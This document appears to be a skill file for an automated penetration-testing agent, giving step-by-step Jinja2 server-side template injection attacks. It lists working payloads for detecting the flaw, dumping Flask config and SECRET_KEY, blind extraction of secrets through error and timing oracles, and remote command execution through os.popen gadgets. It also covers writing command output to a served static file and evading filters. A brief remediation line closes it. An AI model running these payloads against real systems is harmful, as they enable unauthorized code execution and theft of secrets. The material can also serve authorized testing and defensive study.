# Server-side template injection (Jinja2 → RCE)

Flask/FastAPI render with Jinja2; Django uses its own template language (far more
sandboxed). SSTI happens when user input is concatenated into a template string,
e.g. `render_template_string("Hello " + name)` or `f"...{user}..."` rendered.
Classic source: a "name", "search", greeting, or error page that echoes input.

1. **Probe every reflected input** with a math marker — if `{{7*7}}` renders as
   `49`, the engine evaluates input. Sweep all inputs at once with `http_fuzz`:
   marker on the value, `payloads:["{{7*7}}","${7*7}","#{7*7}","{{7*'7'}}"]`,
   `match_regex:"(49|7777777)"`. `49` ⇒ Jinja2; `7777777` ⇒ a different engine.
2. **Confirm engine / reach internals** (no quotes needed):
   - `{{config}}` / `{{config.items()}}` — dumps Flask config incl. `SECRET_KEY`
     (then go to skill: session-jwt to forge the session cookie).
   - `{{request.application.__globals__}}`, `{{self.__init__.__globals__}}`.
   - `{{ ''.__class__.__mro__[1].__subclasses__() }}` — list loaded classes;
     find the index of `subprocess.Popen` / `os._wrap_close`.
2bis. **Blind SSTI (no reflection)** — don't rely on the marker echoing back,
   use an indirect channel:
   - **Error oracle**: `{{ 1/0 if <cond> else 1 }}` — ZeroDivisionError flips
     the response to 500 only when `<cond>` is true. Blind char extraction:
     `{{ 1/0 if config.SECRET_KEY[0]=='a' else 1 }}`, sweep with `http_fuzz`
     (`match_status:500`).
   - **Time oracle**: once the popen gadget is confirmed, gate it instead of a
     literal command:
     `{{ cycler.__init__.__globals__.os.popen('sleep 5').read() if <cond> else '' }}`
     — read `elapsedMs`/`timeMs` instead of the body.
   - **In-band exfil** (no OOB): redirect popen output to a path already served
     statically, then fetch it separately:
     `{{ cycler.__init__.__globals__.os.popen('id > /app/static/o.txt').read() }}`
     then `http_request` the discovered `/static/` path (skill: fingerprint).
3. **RCE** — the reliable short gadget:
   `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
   (also `{{ lipsum.__globals__.os.popen('id').read() }}`,
   `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`).
   Submit via `http_request` and read the command output in the response.
4. If `{` `}` are filtered, try `{%print(7*7)%}` and attribute access via
   `|attr('...')` to dodge dotted-name filters.

Drive the whole sweep with `http_fuzz`, then confirm RCE with one
`http_request from_flow` carrying the popen gadget.

Evidence: `{{7*7}}`→`49` plus the `id`/`uid=` command output in the response.
Remediation: never build templates from user input — render fixed template files
and pass data as context vars; if dynamic, use a sandboxed environment and
autoescape; keep `SECRET_KEY` out of reachable config.
